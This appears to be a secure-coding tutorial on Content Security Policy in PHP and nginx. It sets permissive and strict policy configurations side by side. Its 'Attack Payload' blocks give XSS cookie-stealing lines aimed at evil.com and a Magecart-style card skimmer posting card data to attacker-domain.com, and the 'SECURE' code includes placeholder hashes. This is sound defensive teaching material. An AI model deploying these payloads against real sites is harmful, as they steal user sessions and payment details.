**Additional Protections**:
- **strict-dynamic**: Propagates trust to scripts loaded by trusted scripts, simplifying CDN usage
- **Report-Only Mode**: Test CSP in staging before enforcing in production
- **upgrade-insecure-requests**: Forces HTTPS for all resources
- **object-src 'none'**: Blocks Flash and other plugin content
- **base-uri 'self'**: Prevents base tag hijacking attacks
- **HSTS**: Enforces HTTPS with preload for maximum security

Content Security Policy (CSP) is a critical security header that prevents XSS, clickjacking, and code injection attacks. However, a misconfigured CSP can be completely ineffective or even create a false sense of security. Let me show you dangerous patterns that attackers routinely exploit.

**VULNERABLE CODE**:

```php
<?php
// DANGEROUS: Extremely permissive CSP that provides no real protection
class InsecureHeaderController {

    public function setHeaders() {
        // VULNERABLE: unsafe-inline allows any inline script execution
        // VULNERABLE: unsafe-eval allows eval() and similar functions
        // VULNERABLE: * wildcard allows scripts from ANY domain
        header("Content-Security-Policy: default-src *; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src * data: blob:; font-src *; connect-src *; frame-src *;");
    }

    public function renderPage($userContent) {
        $this->setHeaders();
        // User content rendered without additional protection
        echo "<html><head><title>Dashboard</title></head>";
        echo "<body>";
        echo "<div class='content'>" . $userContent . "</div>";
        echo "</body></html>";
    }
}

// Another common mistake: CSP in meta tag only (can be bypassed)
class MetaOnlyCSP {
    public function renderPage() {
        echo '<html><head>';
        // VULNERABLE: Meta tag CSP can be bypassed and doesn't support all directives
        echo '<meta http-equiv="Content-Security-Policy" content="script-src \'self\'">';
        echo '</head><body></body></html>';
    }
}

$controller = new InsecureHeaderController();
$controller->renderPage($_GET['content'] ?? '');
```

**Attack Payload**:
```html
<!-- XSS payload that works with permissive CSP -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

<!-- Magecart-style payment skimmer injection -->
<script src="https://attacker-cdn.com/skimmer.js"></script>

<!-- Inline event handler (works with unsafe-inline) -->
<img src=x onerror="new Image().src='https://evil.com/'+document.cookie">
```

**Why This Is Dangerous**:
- `unsafe-inline` allows any inline `<script>` tags, enabling XSS attacks to execute
- `unsafe-eval` permits `eval()`, `Function()`, `setTimeout('string')` which attackers use for obfuscation
- Wildcard `*` allows loading scripts from any domain, enabling Magecart-style attacks
- `data:` URIs in img-src can be used for data exfiltration
- Meta tag CSP doesn't support report-uri and can be manipulated by injected content before it

**SECURE VERSION**:

```php
<?php
class SecureCSPController {
    private const NONCE_LENGTH = 32;
    private string $nonce;

    public function __construct() {
        // Generate cryptographically secure nonce for each request
        $this->nonce = base64_encode(random_bytes(self::NONCE_LENGTH));
    }

    public function getNonce(): string {
        return $this->nonce;
    }

    public function setSecureHeaders(): void {
        // Strict CSP with nonce-based script allowlisting
        $csp = implode('; ', [
            "default-src 'self'",
            "script-src 'self' 'nonce-{$this->nonce}' 'strict-dynamic'",
            "style-src 'self' 'nonce-{$this->nonce}'",
            "img-src 'self' https://trusted-cdn.example.com",
            "font-src 'self'",
            "connect-src 'self' https://api.example.com",
            "frame-src 'none'",
            "frame-ancestors 'none'",
            "base-uri 'self'",
            "form-action 'self'",
            "object-src 'none'",
            "upgrade-insecure-requests",
            "report-uri /csp-violation-report"
        ]);

        header("Content-Security-Policy: {$csp}");

        // Additional security headers
        header("X-Content-Type-Options: nosniff");
        header("X-Frame-Options: DENY");
        header("X-XSS-Protection: 0"); // Disabled as CSP is the proper protection
        header("Referrer-Policy: strict-origin-when-cross-origin");
        header("Permissions-Policy: geolocation=(), microphone=(), camera=()");
    }

    public function renderPage(string $sanitizedContent): void {
        $this->setSecureHeaders();
        $nonce = htmlspecialchars($this->nonce, ENT_QUOTES, 'UTF-8');
        $safeContent = htmlspecialchars($sanitizedContent, ENT_QUOTES, 'UTF-8');

        echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Dashboard</title>
    <script nonce="{$nonce}">console.log('Allowed script');</script>
</head>
<body>
    <div class="content">{$safeContent}</div>
</body>
</html>
HTML;
    }
}

$controller = new SecureCSPController();
$controller->renderPage($_GET['content'] ?? '');
```

**Key Security Controls**:
- **Nonce-based allowlisting**: Only scripts with the correct nonce attribute execute, blocking injected scripts
- **'strict-dynamic'**: Allows trusted scripts to load additional scripts while blocking attacker-injected ones
- **No wildcards**: Each source is explicitly defined, preventing loading from untrusted domains
- **object-src 'none'**: Blocks Flash and other plugin-based attack vectors
- **frame-ancestors 'none'**: Prevents clickjacking by blocking iframe embedding
- **report-uri**: Sends violation reports for monitoring and alerting

Managing third-party scripts with strict CSP is one of the most challenging security configurations. The key is to maintain defense in depth while enabling necessary business functionality. Here's a production-ready approach used by major e-commerce platforms.

**PRODUCTION PATTERN**:

```php
<?php
declare(strict_types=1);

namespace App\Security;

use Psr\Log\LoggerInterface;

class ProductionCSPManager {
    private string $nonce;
    private LoggerInterface $logger;
    private array $config;

    // Trusted third-party domains - maintain this list carefully
    private const TRUSTED_SCRIPT_SOURCES = [
        'https://www.googletagmanager.com',
        'https://www.google-analytics.com',
        'https://js.stripe.com',
        'https://cdn.jsdelivr.net'
    ];

    private const TRUSTED_CONNECT_SOURCES = [
        'https://www.google-analytics.com',
        'https://api.stripe.com',
        'https://analytics.example.com'
    ];

    private const TRUSTED_FRAME_SOURCES = [
        'https://js.stripe.com',
        'https://www.youtube.com'
    ];

    public function __construct(LoggerInterface $logger, array $config) {
        $this->logger = $logger;
        $this->config = $config;
        $this->nonce = $this->generateSecureNonce();
    }

    private function generateSecureNonce(): string {
        return base64_encode(random_bytes(32));
    }

    public function getNonce(): string {
        return $this->nonce;
    }

    public function buildCSPHeader(): string {
        $environment = $this->config['environment'] ?? 'production';

        // Base policy - strictest defaults
        $directives = [
            'default-src' => ["'self'"],
            'script-src' => $this->buildScriptSrc($environment),
            'style-src' => $this->buildStyleSrc($environment),
            'img-src' => ["'self'", 'data:', 'https://www.google-analytics.com', 'https://trusted-cdn.example.com'],
            'font-src' => ["'self'", 'https://fonts.gstatic.com'],
            'connect-src' => array_merge(["'self'"], self::TRUSTED_CONNECT_SOURCES),
            'frame-src' => array_merge(["'none'"], self::TRUSTED_FRAME_SOURCES),
            'frame-ancestors' => ["'self'"],
            'base-uri' => ["'self'"],
            'form-action' => ["'self'", 'https://checkout.stripe.com'],
            'object-src' => ["'none'"],
            'worker-src' => ["'self'", 'blob:'],
            'manifest-src' => ["'self'"],
            'upgrade-insecure-requests' => [],
        ];

        // Add reporting endpoint
        if ($environment === 'production') {
            $directives['report-uri'] = ['/api/csp-report'];
            $directives['report-to'] = ['csp-endpoint'];
        }

        return $this->formatDirectives($directives);
    }

    private function buildScriptSrc(string $environment): array {
        $sources = [
            "'self'",
            "'nonce-{$this->nonce}'",
            "'strict-dynamic'"  // Allows trusted scripts to load dependencies
        ];

        // Add trusted third-party scripts
        $sources = array_merge($sources, self::TRUSTED_SCRIPT_SOURCES);

        // Development only - NEVER in production
        if ($environment === 'development') {
            $this->logger->warning('CSP: Development mode enabled with relaxed script-src');
            // Allow hot reload in development
            $sources[] = 'http://localhost:*';
        }

        return $sources;
    }

    private function buildStyleSrc(string $environment): array {
        $sources = [
            "'self'",
            "'nonce-{$this->nonce}'",
            'https://fonts.googleapis.com'
        ];

        // Some third-party widgets require unsafe-inline for styles
        // Use with caution and document the reason
        if ($this->config['allow_stripe_styles'] ?? false) {
            $sources[] = "'unsafe-hashes'";
            // SHA256 hash of specific inline styles required by Stripe
            $sources[] = "'sha256-specific-hash-here'";
        }

        return $sources;
    }

    private function formatDirectives(array $directives): string {
        $parts = [];
        foreach ($directives as $directive => $sources) {
            if (empty($sources)) {
                $parts[] = $directive;
            } else {
                $parts[] = $directive . ' ' . implode(' ', $sources);
            }
        }
        return implode('; ', $parts);
    }

    public function setAllSecurityHeaders(): void {
        // Primary CSP header
        header('Content-Security-Policy: ' . $this->buildCSPHeader());

        // Report-To header for CSP reporting API
        $reportTo = json_encode([
            'group' => 'csp-endpoint',
            'max_age' => 86400,
            'endpoints' => [
                ['url' => 'https://example.com/api/csp-report']
            ]
        ]);
        header('Report-To: ' . $reportTo);

        // Defense in depth headers
        header('X-Content-Type-Options: nosniff');
        header('X-Frame-Options: SAMEORIGIN');
        header('Referrer-Policy: strict-origin-when-cross-origin');
        header('Permissions-Policy: accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(self "https://js.stripe.com"), usb=()');

        // HSTS - only in production with valid SSL
        if (($this->config['environment'] ?? '') === 'production') {
            header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');
        }
    }
}

// CSP Violation Report Handler
class CSPViolationHandler {
    private LoggerInterface $logger;
    private $alertService;

    public function __construct(LoggerInterface $logger, $alertService) {
        $this->logger = $logger;
        $this->alertService = $alertService;
    }

    public function handleReport(): void {
        $json = file_get_contents('php://input');
        $report = json_decode($json, true);

        if (!$report || !isset($report['csp-report'])) {
            http_response_code(400);
            return;
        }

        $violation = $report['csp-report'];

        // Log all violations
        $this->logger->warning('CSP Violation', [
            'blocked_uri' => $violation['blocked-uri'] ?? 'unknown',
            'violated_directive' => $violation['violated-directive'] ?? 'unknown',
            'document_uri' => $violation['document-uri'] ?? 'unknown',
            'source_file' => $violation['source-file'] ?? 'unknown',
            'line_number' => $violation['line-number'] ?? 0,
            'script_sample' => $violation['script-sample'] ?? '',
            'timestamp' => date('c'),
            'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
        ]);

        // Alert on suspicious patterns
        if ($this->isSuspiciousViolation($violation)) {
            $this->alertService->sendSecurityAlert(
                'Potential XSS Attack Detected',
                $violation
            );
        }

        http_response_code(204);
    }

    private function isSuspiciousViolation(array $violation): bool {
        $suspiciousPatterns = [
            '/eval/',
            '/inline/',
            '/data:text\/html/',
            '/javascript:/',
            '/\.(ru|cn|tk)\//'
        ];

        $blockedUri = $violation['blocked-uri'] ?? '';
        foreach ($suspiciousPatterns as $pattern) {
            if (preg_match($pattern, $blockedUri)) {
                return true;
            }
        }

        return false;
    }
}

// Middleware Integration Example
class SecurityMiddleware {
    private ProductionCSPManager $cspManager;

    public function __construct(LoggerInterface $logger) {
        $config = [
            'environment' => getenv('APP_ENV') ?: 'production',
            'allow_stripe_styles' => true
        ];
        $this->cspManager = new ProductionCSPManager($logger, $config);
    }

    public function handle(callable $next): void {
        // Set security headers before any output
        $this->cspManager->setAllSecurityHeaders();

        // Make nonce available to templates
        $GLOBALS['csp_nonce'] = $this->cspManager->getNonce();

        $next();
    }
}

// Template Helper Function
function csp_nonce(): string {
    return htmlspecialchars($GLOBALS['csp_nonce'] ?? '', ENT_QUOTES, 'UTF-8');
}
```

**Defense in Depth Layers**:

1. **Nonce-based script allowlisting with strict-dynamic**:
```php
// Only scripts with valid nonce execute
// strict-dynamic allows those scripts to load dependencies
$scriptSrc = "'nonce-{$nonce}' 'strict-dynamic'";

// In template:
echo '<script nonce="' . csp_nonce() . '">loadAnalytics();</script>';
```

2. **Subresource Integrity (SRI) for external scripts**:
```php
// Generate and verify SRI hashes for CDN resources
function generateSRITag(string $url, string $expectedHash): string {
    $nonce = csp_nonce();
    return sprintf(
        '<script src="%s" integrity="%s" crossorigin="anonymous" nonce="%s"></script>',
        htmlspecialchars($url, ENT_QUOTES, 'UTF-8'),
        htmlspecialchars($expectedHash, ENT_QUOTES, 'UTF-8'),
        $nonce
    );
}

// Usage:
echo generateSRITag(
    'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js',
    'sha384-Bd0oN/1Rj0S5g6n+EAp7g+BpZPr4R4I5p0UVlR1m1j7hW8Y7d9X8Q9r0HkSjJrL'
);
```

3. **CSP violation monitoring with automated alerting**:
```php
// Real-time violation analysis
private function analyzeViolationPattern(array $violations): void {
    // Group violations by source
    $bySource = [];
    foreach ($violations as $v) {
        $source = $v['blocked-uri'] ?? 'unknown';
        $bySource[$source] = ($bySource[$source] ?? 0) + 1;
    }

    // Alert if sudden spike from unknown source
    foreach ($bySource as $source => $count) {
        if ($count > 10 && !$this->isKnownSource($source)) {
            $this->alertService->sendCriticalAlert(
                "Potential injection attack: {$count} violations from {$source}"
            );
        }
    }
}
```

**Additional Protections**:

- **CSP Report-Only Mode for testing**: Deploy `Content-Security-Policy-Report-Only` header first to identify issues without breaking functionality
- **Hash-based allowlisting**: For unavoidable inline scripts, use SHA-256 hashes instead of `unsafe-inline`
- **Regular policy audits**: Review CSP violations weekly and remove unused trusted sources
- **Trusted Types API**: For modern browsers, add `require-trusted-types-for 'script'` to prevent DOM-based XSS
- **Automated testing**: Include CSP validation in CI/CD pipeline using tools like csp-evaluator

**Monitoring Dashboard Metrics**:
- Total CSP violations per hour/day
- Unique blocked URIs
- Geographic distribution of violations
- Violation trends over time
- Alert on >50% increase in violations

Using `unsafe-inline` in your Content Security Policy essentially defeats the purpose of CSP and leaves your application vulnerable to XSS attacks. This was a key factor in major breaches like the British Airways Magecart attack.

**VULNERABLE CODE**:

```docker
# Dockerfile with permissive CSP configuration
FROM nginx:1.25-alpine

# Copy application files
COPY ./dist /usr/share/nginx/html

# DANGEROUS: Overly permissive nginx config
COPY nginx.conf /etc/nginx/conf.d/default.conf

EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]
```

```text
# nginx.conf - VULNERABLE CONFIGURATION
server {
    listen 80;
    server_name example.com;

    root /usr/share/nginx/html;
    index index.html;

    # DANGEROUS: Permissive CSP allows XSS attacks
    add_header Content-Security-Policy "default-src *; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src * data: blob:; font-src *; connect-src *;";

    location / {
        try_files $uri $uri/ /index.html;
    }
}
```

**Attack Payload**:
```html
<!-- Injected via stored XSS or compromised third-party script -->
<script>
  // Magecart-style payment card skimming
  document.querySelector('form').addEventListener('submit', function(e) {
    var cardData = {
      number: document.getElementById('card-number').value,
      cvv: document.getElementById('cvv').value,
      expiry: document.getElementById('expiry').value
    };
    // Exfiltrate to attacker server - allowed by wildcard CSP
    fetch('https://attacker-domain.com/collect', {
      method: 'POST',
      body: JSON.stringify(cardData)
    });
  });
</script>
```

**Why This Is Dangerous**:
- `script-src *` allows JavaScript from ANY domain, enabling third-party script injection
- `'unsafe-inline'` allows inline `<script>` tags, the primary XSS attack vector
- `'unsafe-eval'` allows `eval()`, `Function()`, and similar dangerous functions
- `connect-src *` allows data exfiltration to any external server
- Attackers can inject and execute malicious code that steals user data

**SECURE VERSION**:

```docker
# Dockerfile with secure CSP configuration
FROM nginx:1.25-alpine

# Create non-root user for security
RUN addgroup -g 1001 -S appgroup && \
    adduser -u 1001 -S appuser -G appgroup

# Copy application files
COPY --chown=appuser:appgroup ./dist /usr/share/nginx/html

# Copy secure nginx configuration
COPY nginx-secure.conf /etc/nginx/conf.d/default.conf

# Remove default nginx configs that might override
RUN rm -f /etc/nginx/conf.d/default.conf.bak

# Set proper permissions
RUN chmod -R 755 /usr/share/nginx/html && \
    chown -R appuser:appgroup /var/cache/nginx && \
    chown -R appuser:appgroup /var/log/nginx && \
    touch /var/run/nginx.pid && \
    chown appuser:appgroup /var/run/nginx.pid

USER appuser
EXPOSE 8080
CMD ["nginx", "-g", "daemon off;"]
```

```text
# nginx-secure.conf - SECURE CONFIGURATION
server {
    listen 8080;
    server_name example.com;

    root /usr/share/nginx/html;
    index index.html;

    # SECURE: Restrictive CSP with nonce support
    # Generate nonce dynamically in your application
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-$request_id' https://trusted-cdn.example.com; style-src 'self' 'nonce-$request_id'; img-src 'self' data: https://images.example.com; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests;" always;

    # Additional security headers
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;

    location / {
        try_files $uri $uri/ /index.html;
    }
}
```

**Key Security Controls**:
- `default-src 'self'` - Only allow resources from same origin by default
- `script-src` with nonce - Only execute scripts with valid cryptographic nonce, blocking inline injection
- `connect-src 'self' https://api.example.com` - Restricts where data can be sent, preventing exfiltration
- `frame-ancestors 'none'` - Prevents clickjacking attacks
- `upgrade-insecure-requests` - Forces HTTPS for all requests

